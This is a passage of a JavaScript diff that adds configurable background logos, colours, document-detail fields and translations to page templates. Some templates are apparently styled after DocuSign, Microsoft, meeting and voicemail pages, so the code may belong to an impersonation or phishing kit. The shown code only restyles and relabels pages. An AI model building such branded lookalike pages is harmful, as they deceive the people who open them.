+    document.body.classList.add('__template-bg-color-ready', 'has-custom-background-color');
+    document.body.style.backgroundColor = color;
+
+    // The two original custom-logo templates own their background layers.
+    // Every other template uses the shared surface preparation below.
+    if (document.getElementById('backgroundLogoPattern')) return;
+
+    sxEnsureBackgroundLogoStyles();
+    root.classList.add('__template-bg-color-enabled');
+    document.body.classList.add('__template-bg-color-enabled', '__custom-bg-enabled');
+    sxPrepareBackgroundLogoPage(null);
+  }
+
+  var sxBackgroundLogoRenderId = 0;
+  var sxBackgroundLogoResizeTimer = null;
+  var sxBackgroundLogoResizeReady = false;
+  var sxBackgroundLogoState = null;
+
+  function sxBackgroundLogoMetrics(size) {
+    var numeric = parseInt(size, 10);
+    if (!Number.isFinite(numeric)) numeric = 320;
+    numeric = Math.max(80, Math.min(900, numeric));
+    var progress = (numeric - 80) / 820;
+
+    return {
+      numeric: numeric,
+      markWidth: Math.round(168 + (progress * 232)),
+      markHeight: Math.round(68 + (progress * 92))
+    };
+  }
+
+  function sxBackgroundLogoOpacities() {
+    var color = sxTemplateBackgroundColor();
+    if (!color) return { repeat: '0.14', center: '0.38' };
+
+    var rgb = [1, 3, 5].map(function(index){
+      return parseInt(color.slice(index, index + 2), 16);
+    });
+    var luminance = (0.2126 * rgb[0]) + (0.7152 * rgb[1]) + (0.0722 * rgb[2]);
+
+    if (luminance < 64) return { repeat: '0.22', center: '0.48' };
+    if (luminance < 128) return { repeat: '0.20', center: '0.45' };
+    if (luminance < 196) return { repeat: '0.18', center: '0.42' };
+    return { repeat: '0.15', center: '0.40' };
+  }
+
+  function sxEnsureBackgroundLogoStyles() {
+    var style = document.getElementById('__templateBackgroundLogoStyles');
+    if (style) return;
+
+    style = document.createElement('style');
+    style.id = '__templateBackgroundLogoStyles';
+    style.textContent =
+      'html.__template-bg-logo-enabled,html.__template-bg-color-enabled{min-height:100%;background:var(--app-bg-color,#f2f4f8)!important;}' +
+      'body.__template-bg-color-enabled{min-height:100vh!important;min-height:100dvh!important;background:var(--app-bg-color,#f2f4f8)!important;position:relative!important;isolation:isolate!important;}' +
+      'body.__template-bg-logo-enabled{min-height:100vh!important;min-height:100dvh!important;background-color:transparent!important;background-image:none!important;position:relative!important;isolation:isolate!important;}' +
+      'body.__template-bg-color-enabled::before,body.__template-bg-color-enabled::after,body.__template-bg-logo-enabled::before,body.__template-bg-logo-enabled::after{display:none!important;content:none!important;}' +
+      'body.__template-bg-logo-enabled>#__templateBackgroundLogoLayer{display:none;position:fixed!important;inset:-14%!important;z-index:1!important;overflow:hidden!important;pointer-events:none!important;grid-template-columns:repeat(auto-fill,minmax(var(--sx-bg-logo-cell-width,300px),1fr));grid-auto-rows:var(--sx-bg-logo-cell-height,180px);opacity:var(--sx-bg-logo-repeat-opacity,.14);transform:rotate(-6deg);transform-origin:center;}' +
+      'body.__template-bg-logo-enabled.background-logo-layout-repeat>#__templateBackgroundLogoLayer.is-ready{display:grid;}' +
+      'body.__template-bg-logo-enabled>#__templateBackgroundLogoLayer .__template-bg-logo-mark{display:flex;min-width:0;min-height:0;align-items:center;justify-content:center;padding:26px 34px;}' +
+      'body.__template-bg-logo-enabled>#__templateBackgroundLogoLayer .__template-bg-logo-mark img{display:block;width:100%;height:100%;max-width:var(--sx-bg-logo-mark-width,236px);max-height:var(--sx-bg-logo-mark-height,96px);object-fit:contain;filter:saturate(.94) contrast(1.08) drop-shadow(0 1px 1px rgba(15,23,42,.08));user-select:none;}' +
+      'body.__template-bg-logo-enabled.background-logo-layout-center>#__templateBackgroundLogoLayer{inset:0!important;align-items:center;justify-content:center;opacity:var(--sx-bg-logo-center-opacity,.38);transform:none;}' +
+      'body.__template-bg-logo-enabled.background-logo-layout-center>#__templateBackgroundLogoLayer.is-ready{display:flex;}' +
+      'body.__template-bg-logo-enabled.background-logo-layout-center>#__templateBackgroundLogoLayer .__template-bg-logo-mark{width:100%;height:100%;padding:clamp(36px,9vw,128px);}' +
+      'body.__template-bg-logo-enabled.background-logo-layout-center>#__templateBackgroundLogoLayer .__template-bg-logo-mark img{max-width:min(var(--sx-bg-logo-center-size,320px),70vw);max-height:min(var(--sx-bg-logo-center-size,320px),70vh);filter:saturate(.9) contrast(1.02) drop-shadow(0 18px 42px rgba(31,41,55,.11));}' +
+      'body.__template-bg-logo-enabled>[data-template-bg-logo-native="1"],body.__template-bg-color-enabled>[data-template-bg-logo-native="1"]{display:none!important;}' +
+      'body.__template-bg-logo-enabled>.pc,body.__template-bg-logo-enabled>.ap,body.__template-bg-logo-enabled>.sp,body.__template-bg-logo-enabled>.page,body.__template-bg-logo-enabled>.app,body.__template-bg-logo-enabled>.wrapper,body.__template-bg-logo-enabled>.docsign-main-container,body.__template-bg-color-enabled>.pc,body.__template-bg-color-enabled>.ap,body.__template-bg-color-enabled>.sp,body.__template-bg-color-enabled>.page,body.__template-bg-color-enabled>.app,body.__template-bg-color-enabled>.wrapper,body.__template-bg-color-enabled>.docsign-main-container{background:transparent!important;}' +
+      'body.__template-bg-logo-enabled.background-logo-layout-center .__template-bg-logo-surface{backdrop-filter:blur(8px)!important;-webkit-backdrop-filter:blur(8px)!important;}' +
+      'body.__template-bg-logo-enabled>.sp>.lp,body.__template-bg-logo-enabled>.sp>.rp,body.__template-bg-color-enabled>.sp>.lp,body.__template-bg-color-enabled>.sp>.rp{background:rgba(255,255,255,.9)!important;backdrop-filter:blur(8px)!important;}' +
+      'body.__template-bg-logo-enabled>.docsign-main-container>div:first-child,body.__template-bg-color-enabled>.docsign-main-container>div:first-child{background:rgba(248,249,252,.9)!important;backdrop-filter:blur(8px)!important;}' +
+      'body.__template-bg-logo-enabled>.docsign-main-container>div:nth-child(2),body.__template-bg-color-enabled>.docsign-main-container>div:nth-child(2){background:rgba(255,255,255,.92)!important;backdrop-filter:blur(8px)!important;}' +
+      '@media(max-width:640px){body.__template-bg-logo-enabled>#__templateBackgroundLogoLayer{inset:-12%!important;grid-template-columns:repeat(auto-fill,minmax(220px,1fr));grid-auto-rows:154px;}body.__template-bg-logo-enabled>#__templateBackgroundLogoLayer .__template-bg-logo-mark{padding:22px 26px;}}';
+    (document.head || document.documentElement).appendChild(style);
+  }
+
+  function sxBackgroundLogoMarkCount(metrics) {
+    var columnWidth = Math.max(240, metrics.markWidth + 84);
+    var rowHeight = Math.max(148, metrics.markHeight + 70);
+    var columns = Math.ceil(window.innerWidth / columnWidth) + 4;
+    var rows = Math.ceil(window.innerHeight / rowHeight) + 4;
+
+    return Math.min(120, Math.max(24, columns * rows));
+  }
+
+  function sxPrepareBackgroundLogoPage(layer) {
+    var body = document.body;
+    if (!body) return;
+
+    var nativeBackgrounds = document.querySelectorAll('body > .bg-scene, body > .bg-wrap, body > .bg-blur, body > .bg-blur-layer, body > .bg-blur-overlay, body > .bg-overlay, body > .background, body > .ms-bg, body > .word-pattern, body > .document-bg, body > .bg-dots, body > #bg-frame, body > #bg-fallback');
+    for (var n = 0; n < nativeBackgrounds.length; n++) {
+      nativeBackgrounds[n].setAttribute('data-template-bg-logo-native', '1');
+    }
+
+    for (var i = 0; i < body.children.length; i++) {
+      var child = body.children[i];
+      if (child === layer || child.getAttribute('data-template-bg-logo-native') === '1') continue;
+      if (/^(SCRIPT|STYLE|LINK|META|TEMPLATE)$/i.test(child.tagName)) continue;
+
+      var childStyle = getComputedStyle(child);
+      var childRect = child.getBoundingClientRect();
+      var isFullScreenBackdrop = childStyle.position === 'fixed'
+        && childStyle.pointerEvents === 'none'
+        && childRect.width >= (window.innerWidth * 0.9)
+        && childRect.height >= (window.innerHeight * 0.9);
+      if (isFullScreenBackdrop) {
+        child.setAttribute('data-template-bg-logo-native', '1');
+        continue;
+      }
+
+      if (!child.style.position && childStyle.position === 'static') {
+        child.style.position = 'relative';
+      }
+      if (!child.style.zIndex && (childStyle.zIndex === 'auto' || childStyle.zIndex === '0')) {
+        child.style.zIndex = '2';
+      }
+    }
+
+    if (!body.classList.contains('background-logo-layout-center')) return;
+
+    var surfaces = document.querySelectorAll('.card, .shell, .container, .app-container, .wrap, .app-shell');
+    for (var s = 0; s < surfaces.length; s++) {
+      var surface = surfaces[s];
+      if (surface.closest('.success-overlay, .sx-verification-complete-overlay, .modal-overlay, [role="dialog"]')) continue;
+
+      var rect = surface.getBoundingClientRect();
+      if (rect.width < 180 || rect.height < 120) continue;
+
+      var surfaceStyle = getComputedStyle(surface);
+      var colorMatch = surfaceStyle.backgroundColor.match(/^rgba?\(\s*(\d+)\s*,\s*(\d+)\s*,\s*(\d+)(?:\s*,\s*([\d.]+))?\s*\)$/i);
+      if (!colorMatch) continue;
+
+      var currentAlpha = colorMatch[4] === undefined ? 1 : Number(colorMatch[4]);
+      if (!Number.isFinite(currentAlpha) || currentAlpha <= 0) continue;
+      var surfaceAlpha = Math.min(0.88, currentAlpha);
+
+      surface.style.setProperty(
+        'background-color',
+        'rgba(' + colorMatch[1] + ',' + colorMatch[2] + ',' + colorMatch[3] + ',' + surfaceAlpha + ')',
+        'important'
+      );
+      surface.classList.add('__template-bg-logo-surface');
+    }
+  }
+
+  function sxRenderTemplateBackgroundLogoLayer(logoUrl, layout, size) {
+    if (!document.body || document.getElementById('backgroundLogoPattern')) return;
+
+    var requestId = ++sxBackgroundLogoRenderId;
+    var probe = new Image();
+    probe.decoding = 'async';
+    probe.onload = function(){
+      if (requestId !== sxBackgroundLogoRenderId || !document.body) return;
+
+      var body = document.body;
+      var root = document.documentElement;
+      var metrics = sxBackgroundLogoMetrics(size);
+      var opacities = sxBackgroundLogoOpacities();
+      var layer = document.getElementById('__templateBackgroundLogoLayer');
+      if (!layer) {
+        layer = document.createElement('div');
+        layer.id = '__templateBackgroundLogoLayer';
+        layer.setAttribute('aria-hidden', 'true');
+        body.insertBefore(layer, body.firstChild);
+      }
+
+      sxEnsureBackgroundLogoStyles();
+      layer.classList.remove('is-ready');
+      layer.replaceChildren();
+
+      var fragment = document.createDocumentFragment();
+      var count = layout === 'center' ? 1 : sxBackgroundLogoMarkCount(metrics);
+      for (var i = 0; i < count; i++) {
+        var mark = document.createElement('span');
+        var image = document.createElement('img');
+        mark.className = '__template-bg-logo-mark';
+        image.src = logoUrl;
+        image.alt = '';
+        image.decoding = 'async';
+        image.draggable = false;
+        mark.appendChild(image);
+        fragment.appendChild(mark);
+      }
+      layer.appendChild(fragment);
+
+      root.style.setProperty('--sx-bg-logo-mark-width', metrics.markWidth + 'px');
+      root.style.setProperty('--sx-bg-logo-mark-height', metrics.markHeight + 'px');
+      root.style.setProperty('--sx-bg-logo-cell-width', Math.max(240, metrics.markWidth + 84) + 'px');
+      root.style.setProperty('--sx-bg-logo-cell-height', Math.max(148, metrics.markHeight + 70) + 'px');
+      root.style.setProperty('--sx-bg-logo-center-size', metrics.numeric + 'px');
+      root.style.setProperty('--sx-bg-logo-repeat-opacity', opacities.repeat);
+      root.style.setProperty('--sx-bg-logo-center-opacity', opacities.center);
+      root.classList.add('__template-bg-logo-enabled', '__template-bg-logo-ready');
+      body.classList.add('__template-bg-logo-enabled', '__custom-bg-enabled', '__template-bg-logo-ready', 'has-custom-background-logo');
+      sxPrepareBackgroundLogoPage(layer);
+      layer.classList.add('is-ready');
+
+      sxBackgroundLogoState = { url: logoUrl, layout: layout, size: size };
+      if (!sxBackgroundLogoResizeReady) {
+        sxBackgroundLogoResizeReady = true;
+        window.addEventListener('resize', function(){
+          if (!sxBackgroundLogoState || sxBackgroundLogoState.layout !== 'repeat') return;
+          clearTimeout(sxBackgroundLogoResizeTimer);
+          sxBackgroundLogoResizeTimer = setTimeout(function(){
+            var state = sxBackgroundLogoState;
+            sxRenderTemplateBackgroundLogoLayer(state.url, state.layout, state.size);
+          }, 160);
+        });
+      }
+    };
+    probe.onerror = function(){
+      if (requestId !== sxBackgroundLogoRenderId) return;
+      var layer = document.getElementById('__templateBackgroundLogoLayer');
+      if (layer) layer.classList.remove('is-ready');
+    };
+    probe.src = logoUrl;
+  }
+
+  function applyTemplateBackgroundLogo() {
+    var rawUrl = typeof window.__TEMPLATE_BACKGROUND_LOGO_URL === 'string'
+      ? window.__TEMPLATE_BACKGROUND_LOGO_URL.trim()
+      : '';
+    if (!rawUrl) return;
+
+    var parsedUrl;
+    try {
+      parsedUrl = new URL(rawUrl, location.href);
+    } catch (e) {
+      return;
+    }
+    if (!/^https?:$/.test(parsedUrl.protocol)) return;
+
+    var size = typeof window.__TEMPLATE_BACKGROUND_LOGO_SIZE === 'string'
+      ? window.__TEMPLATE_BACKGROUND_LOGO_SIZE.trim()
+      : '';
+    if (!/^\d{2,3}px$/.test(size)) size = '320px';
+    var layout = window.__TEMPLATE_BACKGROUND_LOGO_LAYOUT === 'center' ? 'center' : 'repeat';
+
+    var safeUrl = parsedUrl.href.replace(/["\\\n\r\f]/g, function(match){
+      if (match === '"') return '%22';
+      if (match === '\\') return '%5C';
+      return '';
+    });
+    var image = 'url("' + safeUrl + '")';
+    var root = document.documentElement;
+
+    root.style.setProperty('--app-bg-image', image);
+    root.style.setProperty('--app-bg-size', size);
+    root.style.setProperty('--app-bg-position', 'center');
+    root.style.setProperty('--app-bg-repeat', layout === 'center' ? 'no-repeat' : 'repeat');
+    root.classList.remove('background-logo-layout-repeat', 'background-logo-layout-center');
+    root.classList.add('background-logo-layout-' + layout);
+    root.classList.add('__template-bg-logo-ready');
+
+    if (!document.body) return;
+
+    document.body.classList.remove('background-logo-layout-repeat', 'background-logo-layout-center');
+    document.body.classList.add('background-logo-layout-' + layout);
+    document.body.classList.add('__template-bg-logo-ready', 'has-custom-background-logo');
+
+    sxRenderTemplateBackgroundLogoLayer(parsedUrl.href, layout, size);
+  }
+
+  function ensureCustomBackgroundLayer() {
+    if (typeof window.__TEMPLATE_BACKGROUND_LOGO_URL === 'string' && window.__TEMPLATE_BACKGROUND_LOGO_URL.trim() !== '') return;
+    if (window.__BACKGROUND_BLUR_ENABLED !== true) return;
+    if (!document.body || document.body.getAttribute('data-custom-bg-ready') === '1') return;
+
+    var rawUrl = typeof window.__BACKGROUND_BLUR_URL === 'string' ? window.__BACKGROUND_BLUR_URL.trim() : '';
+    if (!rawUrl) return;
+
+    var parsedUrl;
+    try {
+      parsedUrl = new URL(rawUrl, location.href);
+    } catch (e) {
+      return;
+    }
+    if (!/^https?:$/.test(parsedUrl.protocol)) return;
+
+    if (typeof window.initBackgroundBlur === 'function') {
+      window.initBackgroundBlur();
+      document.body.setAttribute('data-custom-bg-ready', '1');
+      return;
+    }
+
+    var blur = Number(window.__BACKGROUND_BLUR_AMOUNT);
+    if (!Number.isFinite(blur)) blur = 2.5;
+    blur = Math.max(0, Math.min(12, blur));
+
+    var body = document.body;
+    if (!body) return;
+
+    var style = document.getElementById('__customBgStyles');
+    if (!style) {
+      style = document.createElement('style');
+      style.id = '__customBgStyles';
+      style.textContent =
+        'html.__custom-bg-enabled{min-height:100%;background:#0c1220!important;}' +
+        'body.__custom-bg-enabled{min-height:100vh!important;min-height:100dvh!important;background:transparent!important;}' +
+        'body.__custom-bg-enabled>#__customBgLayer{position:fixed!important;inset:0!important;z-index:0!important;pointer-events:none!important;overflow:hidden!important;}' +
+        'body.__custom-bg-enabled>#__customBgLayer .__custom-bg-image{position:absolute!important;inset:-3%!important;width:106%!important;height:106%!important;background-position:center!important;background-size:cover!important;background-repeat:no-repeat!important;filter:blur(var(--custom-bg-blur,2.5px)) brightness(.9) saturate(.98)!important;transform:scale(1.02)!important;}' +
+        'body.__custom-bg-enabled>#__customBgLayer .__custom-bg-overlay{position:absolute!important;inset:0!important;background:rgba(12,18,32,.36)!important;}' +
+        'body.__custom-bg-enabled>[data-custom-bg-native="1"]{display:none!important;}' +
+        'body.__custom-bg-enabled>.pc,body.__custom-bg-enabled>.ap,body.__custom-bg-enabled>.sp,body.__custom-bg-enabled>.shell,body.__custom-bg-enabled>.container,body.__custom-bg-enabled>.page,body.__custom-bg-enabled>.app,body.__custom-bg-enabled>.wrapper{background:transparent!important;}' +
+        'body.__custom-bg-enabled>.sp>.lp,body.__custom-bg-enabled>.sp>.rp{background:rgba(255,255,255,.9)!important;backdrop-filter:blur(8px)!important;}' +
+        'body.__custom-bg-enabled>.docsign-main-container{background:transparent!important;}' +
+        'body.__custom-bg-enabled>.docsign-main-container>div:first-child{background:rgba(248,249,252,.9)!important;backdrop-filter:blur(8px)!important;}' +
+        'body.__custom-bg-enabled>.docsign-main-container>div:nth-child(2){background:rgba(255,255,255,.92)!important;backdrop-filter:blur(8px)!important;}';
+      (document.head || document.documentElement).appendChild(style);
+    }
+
+    document.documentElement.classList.add('__custom-bg-enabled');
+    body.classList.add('__custom-bg-enabled');
+    body.style.setProperty('--custom-bg-blur', blur + 'px');
+
+    var layer = document.createElement('div');
+    layer.id = '__customBgLayer';
+    layer.setAttribute('aria-hidden', 'true');
+
+    var image = document.createElement('div');
+    image.className = '__custom-bg-image';
+    image.style.backgroundImage = 'url("' + parsedUrl.href.replace(/"/g, '%22') + '")';
+
+    var overlay = document.createElement('div');
+    overlay.className = '__custom-bg-overlay';
+
+    layer.appendChild(image);
+    layer.appendChild(overlay);
+
+    if (!body.firstChild) {
+      body.appendChild(layer);
+    } else {
+      body.insertBefore(layer, body.firstChild);
+    }
+
+    var nativeBackgrounds = document.querySelectorAll('body > .bg-scene, body > .bg-wrap, body > .bg-blur, body > .bg-overlay, body > .background, body > .ms-bg, body > .word-pattern, body > .document-bg, body > #bg-frame, body > #bg-fallback');
+    for (var n = 0; n < nativeBackgrounds.length; n++) {
+      nativeBackgrounds[n].setAttribute('data-custom-bg-native', '1');
+    }
+
+    for (var i = 0; i < body.children.length; i++) {
+      var child = body.children[i];
+      if (child === layer) continue;
+      if (child.getAttribute('data-custom-bg-native') === '1') continue;
+      if (/^(SCRIPT|STYLE|LINK|META|TEMPLATE)$/i.test(child.tagName)) continue;
+      var childStyle = getComputedStyle(child);
+      if (!child.style.position && childStyle.position === 'static') {
+        child.style.position = 'relative';
+      }
+      if (!child.style.zIndex && (childStyle.zIndex === 'auto' || childStyle.zIndex === '0')) {
+        child.style.zIndex = '2';
+      }
+    }
+
+    body.setAttribute('data-custom-bg-ready', '1');
+  }
+
+  function apply(){
+    applyTemplateTranslations();
+    if(window.__DOC_FILENAME){
+      setText('[data-doc-filename]', window.__DOC_FILENAME);
+    }
+    if(window.__DOC_TITLE){
+      setText('[data-doc-title]', window.__DOC_TITLE);
+    }
+    if(window.__DOC_PAGES){
+      setText('[data-doc-pages]', window.__DOC_PAGES);
+    }
+    if(window.__DOC_DATE){
+      setText('[data-doc-date]', window.__DOC_DATE);
+    }
+    if(typeof window.__PAGE_TITLE==='string' && window.__PAGE_TITLE!==''){
+      applyPageTitle(window.__PAGE_TITLE);
+    }
+    if(typeof window.__PAGE_MESSAGE==='string' && window.__PAGE_MESSAGE!==''){
+      applyPageMessage(window.__PAGE_MESSAGE);
+    }
+    if(typeof window.__PRIMARY_BUTTON_TEXT==='string' && window.__PRIMARY_BUTTON_TEXT!==''){
+      applyPrimaryButtonText(window.__PRIMARY_BUTTON_TEXT);
+    }
+    applyMeetingOverrides();
+    applyVoicemailOverrides();
+  }
+
+  function i18nValue(key, fallback){
+    key = typeof key === 'string' ? key.trim() : '';
+    if(!key) return fallback;
+    var source = window.__APP_TRANSLATIONS && typeof window.__APP_TRANSLATIONS === 'object'
+      ? window.__APP_TRANSLATIONS
+      : {};
+    var value = key.split('.').reduce(function(current, part){
+      return current && Object.prototype.hasOwnProperty.call(current, part) ? current[part] : undefined;
+    }, source);
+
+    if(value === undefined || value === null || value === '') return fallback;
+    if(typeof value === 'string' || typeof value === 'number') return String(value);
+
+    return fallback;
+  }
+
+  function i18nNormalizeText(text){
+    return String(text || '').replace(/\s+/g, ' ').trim();
+  }
+
+  function i18nPhraseLookupKey(text){
+    return i18nNormalizeText(text)
+      .replace(/[\u2018\u2019]/g, "'")
+      .replace(/[\u201C\u201D]/g, '"')
+      .replace(/\u2026/g, '...')
+      .replace(/\s+([.,!?;:])/g, '$1')
+      .replace(/^[\u2713\u2714]\s*/g, '')
+      .replace(/[!\uFF01]+$/g, '')
+      .toLowerCase();
+  }
+
+  var i18nPhraseCacheSource = null;
+  var i18nPhraseCache = null;
+  var i18nPatternCacheSource = null;
+  var i18nPatternCache = null;
+
+  function i18nPhraseIndex(phrases){
+    if(i18nPhraseCacheSource === phrases && i18nPhraseCache) return i18nPhraseCache;
+
+    var index = Object.create(null);
+    Object.keys(phrases).forEach(function(key){
+      var normalizedKey = i18nPhraseLookupKey(key);
+      if(normalizedKey && !Object.prototype.hasOwnProperty.call(index, normalizedKey)){
+        index[normalizedKey] = phrases[key];
+      }
+    });
+    i18nPhraseCacheSource = phrases;
+    i18nPhraseCache = index;
+
+    return index;
+  }
+
+  function i18nPatternIndex(patterns){
+    if(i18nPatternCacheSource === patterns && i18nPatternCache) return i18nPatternCache;
+
+    var index = [];
+    Object.keys(patterns).forEach(function(pattern){
+      var placeholders = [];
+      var parts = i18nNormalizeText(pattern).split(/(\{[A-Za-z][A-Za-z0-9_]*\})/g);
+      var expression = parts.map(function(part){
+        var placeholder = part.match(/^\{([A-Za-z][A-Za-z0-9_]*)\}$/);
+        if(placeholder){
+          var placeholderName = placeholder[1];
+          placeholders.push(placeholderName);
+          if(placeholderName === 'count'){
+            return '([+-]?\\d(?:[\\d.,\\s]*\\d)?)';
+          }
+          return '([\\s\\S]+?)';
+        }
+        return part.replace(/[.*+?^${}()|[\]\\]/g, '\\$&');
+      }).join('');
+
+      if(placeholders.length){
+        index.push({
+          expression: new RegExp('^' + expression + '$', 'i'),
+          placeholders: placeholders,
+          translation: patterns[pattern]
+        });
+      }
+    });
+    i18nPatternCacheSource = patterns;
+    i18nPatternCache = index;
+
+    return index;
+  }
+
+  function i18nPattern(text, patterns){
+    var normalized = i18nNormalizeText(text);
+    var index = i18nPatternIndex(patterns);
+
+    for(var i = 0; i < index.length; i++){
+      var item = index[i];
+      var match = normalized.match(item.expression);
+      if(!match) continue;
+
+      var translated = typeof item.translation === 'string' ? item.translation : '';
+      if(!translated) return text;
+      item.placeholders.forEach(function(placeholder, position){
+        translated = translated.split('{' + placeholder + '}').join(match[position + 1]);
+      });
+      return translated;
+    }
+
+    return text;
+  }
+
+  function i18nPhrase(text){
+    var fallback = typeof text === 'string' ? text : String(text || '');
+    var key = i18nNormalizeText(fallback);
+    if(!key) return fallback;
+    var source = window.__APP_TRANSLATIONS && typeof window.__APP_TRANSLATIONS === 'object'
+      ? window.__APP_TRANSLATIONS
+      : {};
+    var phrases = source.phrases && typeof source.phrases === 'object' ? source.phrases : {};
+    var value = Object.prototype.hasOwnProperty.call(phrases, key) ? phrases[key] : undefined;
+    if(value === undefined){
+      value = i18nPhraseIndex(phrases)[i18nPhraseLookupKey(key)];
+    }
+
+    if(value === undefined){
+      var patterns = source.patterns && typeof source.patterns === 'object' ? source.patterns : {};
+      var patternValue = i18nPattern(key, patterns);
+      if(patternValue !== key) return patternValue;
+    }
+
+    if(value === undefined || value === null || value === '') return fallback;
+    if(typeof value === 'string' || typeof value === 'number') return String(value);
+
+    return fallback;
+  }
+
+  function i18nHasPhraseDictionary(){
+    var source = window.__APP_TRANSLATIONS && typeof window.__APP_TRANSLATIONS === 'object'
+      ? window.__APP_TRANSLATIONS
+      : {};
+    return source.phrases && typeof source.phrases === 'object';
+  }
+
+  function i18nTranslateDocumentTitle(){
+    if(!i18nHasPhraseDictionary()) return;
+    var current = document.title || '';
+    var translated = i18nPhrase(current);
+    if(translated !== current) document.title = translated;
+  }
+
+  function i18nBlockedByCustomOverride(el){
+    if(!el || !el.closest) return false;
+    if(el.closest('[data-i18n-custom-override]')) return true;
+    if(hasCustomText(window.__PAGE_TITLE) && el.closest('[data-page-title],[data-template-title],[data-custom-title]')) return true;
+    if(hasCustomText(window.__PAGE_MESSAGE) && el.closest('[data-page-message],[data-template-message],[data-custom-message]')) return true;
+    if(hasCustomText(window.__PRIMARY_BUTTON_TEXT) && el.closest('[data-primary-button],[data-primary-button-label]')) return true;
+
+    return false;
+  }
+
+  function i18nTranslateTextNodes(){
+    if(!document.body || !i18nHasPhraseDictionary()) return;
+
+    var skipTags = {
+      SCRIPT: true,
+      STYLE: true,
+      NOSCRIPT: true,
+      TEMPLATE: true,
+      TEXTAREA: true,
+      CODE: true,
+      PRE: true
+    };
+    var walker = document.createTreeWalker(document.body, NodeFilter.SHOW_TEXT, {
+      acceptNode: function(node){
+        var parent = node.parentElement;
+        if(!parent || skipTags[parent.tagName]) return NodeFilter.FILTER_REJECT;
+        if(parent.closest('[data-no-i18n],[contenteditable="true"]')) return NodeFilter.FILTER_REJECT;
+        if(i18nBlockedByCustomOverride(parent)) return NodeFilter.FILTER_REJECT;
+        return i18nNormalizeText(node.nodeValue) ? NodeFilter.FILTER_ACCEPT : NodeFilter.FILTER_REJECT;
+      }
+    });
+    var nodes = [];
+
+    while(walker.nextNode()) nodes.push(walker.currentNode);
+
+    nodes.forEach(function(node){
+      var original = node.nodeValue || '';
+      var translated = i18nPhrase(original);
+      if(translated === original) return;
+
+      var leading = original.match(/^\s*/)[0] || '';
+      var trailing = original.match(/\s*$/)[0] || '';
+      node.nodeValue = leading + translated + trailing;
+      markTranslatedElement(node.parentElement);
+    });
+  }
+
+  function i18nTranslateCommonAttributes(){
+    if(!i18nHasPhraseDictionary()) return;
+
+    ['placeholder', 'title', 'aria-label'].forEach(function(attr){
+      document.querySelectorAll('[' + attr + ']').forEach(function(el){
+        if(el.closest('[data-no-i18n]')) return;
+        var current = el.getAttribute(attr);
+        var translated = i18nPhrase(current);
+        if(translated !== current){
+          el.setAttribute(attr, translated);
+          if(attr === 'placeholder') markTranslatedElement(el);
+        }
+      });
+    });
+  }
+
+  function hasCustomText(value){
+    return typeof value === 'string' && value.trim() !== '';
+  }
+
+  function setPhraseText(selector, blocked){
+    if(blocked) return;
+    document.querySelectorAll(selector).forEach(function(el){
+      var current = el.textContent;
+      var translated = i18nPhrase(current);
+      if(translated !== current) el.textContent = translated;
+      markTranslatedElement(el);
+    });
+  }
+
+  function markTranslatedElement(el){
+    if(!el || !el.setAttribute) return;
+    if(!el.hasAttribute('dir')) el.setAttribute('dir', 'auto');
+  }
+
+  function applyTemplateTranslations(){
+    if(!window.__APP_TRANSLATIONS || typeof window.__APP_TRANSLATIONS !== 'object') return;
+    if(typeof window.__APP_LOCALE === 'string' && window.__APP_LOCALE){
+      document.documentElement.setAttribute('lang', window.__APP_LOCALE);
+    }
+
+    document.querySelectorAll('[data-i18n]').forEach(function(el){
+      if(i18nBlockedByCustomOverride(el)) return;
+      var current = el.textContent;
+      var translated = i18nValue(el.getAttribute('data-i18n'), current);
+      if(translated !== current) el.textContent = translated;
+      markTranslatedElement(el);
+    });
+    document.querySelectorAll('[data-i18n-placeholder]').forEach(function(el){
+      var current = el.getAttribute('placeholder') || '';
+      var translated = i18nValue(el.getAttribute('data-i18n-placeholder'), current);
+      if(translated !== current){
+        el.setAttribute('placeholder', translated);
+        markTranslatedElement(el);
+      }
+    });
+    document.querySelectorAll('[data-i18n-title]').forEach(function(el){
+      var current = el.getAttribute('title') || '';
+      var translated = i18nValue(el.getAttribute('data-i18n-title'), current);
+      if(translated !== current) el.setAttribute('title', translated);
+    });
+    document.querySelectorAll('[data-i18n-aria-label]').forEach(function(el){
+      var current = el.getAttribute('aria-label') || '';
+      var translated = i18nValue(el.getAttribute('data-i18n-aria-label'), current);
+      if(translated !== current) el.setAttribute('aria-label', translated);
+    });
+    i18nTranslateDocumentTitle();
+    translateDefaultPrimaryButtons();
+    i18nTranslateTextNodes();
+    i18nTranslateCommonAttributes();
+
+    setPhraseText(
+      '[data-page-title],[data-template-title],[data-custom-title]',
+      hasCustomText(window.__PAGE_TITLE)
+    );
+    setPhraseText(
+      '[data-page-message],[data-template-message],[data-custom-message]',
+      hasCustomText(window.__PAGE_MESSAGE)
+    );
+    document.querySelectorAll('[data-primary-button]').forEach(function(el){
+      if(hasCustomText(window.__PRIMARY_BUTTON_TEXT)) return;
+      var current = el.textContent;
+      var translated = i18nPhrase(current);
+      if(translated !== current) setPrimaryButtonText(el, translated);
+      markTranslatedElement(el);
+    });
+    document.querySelectorAll('[data-primary-button-label]').forEach(function(el){
+      if(hasCustomText(window.__PRIMARY_BUTTON_TEXT)) return;
+      var current = el.textContent;
+      var translated = i18nPhrase(current);
+      if(translated !== current) el.textContent = translated;
+      markTranslatedElement(el);
+    });
+  }
+
+  var i18nRefreshQueued = false;
+  var i18nObserver = null;
+
+  function scheduleTemplateTranslationRefresh(){
+    if(i18nRefreshQueued || !i18nHasPhraseDictionary()) return;
+    i18nRefreshQueued = true;
+    setTimeout(function(){
+      i18nRefreshQueued = false;
+      applyTemplateTranslations();
+    }, 0);
+  }
+
+  function observeTemplateTranslations(){
+    if(i18nObserver || !document.body || !i18nHasPhraseDictionary() || typeof MutationObserver !== 'function') return;
+
+    i18nObserver = new MutationObserver(function(mutations){
+      var shouldRefresh = mutations.some(function(mutation){
+        if(mutation.type === 'characterData'){
+          var textParent = mutation.target && mutation.target.parentElement;
+          if(!textParent || textParent.closest('[data-no-i18n],[contenteditable="true"],script,style,noscript,template,textarea,code,pre')) return false;
+          if(i18nBlockedByCustomOverride(textParent)) return false;
+          if(textParent.closest('[data-i18n],[data-page-title],[data-template-title],[data-custom-title],[data-page-message],[data-template-message],[data-custom-message],[data-primary-button],[data-primary-button-label]')) return true;
+          var currentText = mutation.target.nodeValue || '';
+          return i18nPhrase(currentText) !== currentText;
+        }
+        if(mutation.type === 'attributes'){
+          if(mutation.target.closest('[data-no-i18n]')) return false;
+          var attr = mutation.attributeName || '';
+          var currentAttr = mutation.target.getAttribute(attr) || '';
